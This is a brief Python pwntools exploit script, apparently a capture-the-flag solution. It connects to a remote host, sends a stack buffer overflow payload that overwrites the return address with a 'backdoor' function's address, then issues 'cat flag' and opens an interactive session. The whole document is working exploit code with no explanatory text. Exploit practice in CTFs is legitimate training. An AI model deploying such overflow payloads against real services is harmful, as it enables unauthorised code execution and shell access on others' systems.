from pwn import *

a = 64
conn = remote("119.3.83.106", 10323)
conn.recvline()
backdoor = 0x00000000004011DD
payload = b'a' * a + b"12335578" + p64(backdoor)
conn.sendline(payload)
conn.sendline(b" cat flag ")
conn.interactive()
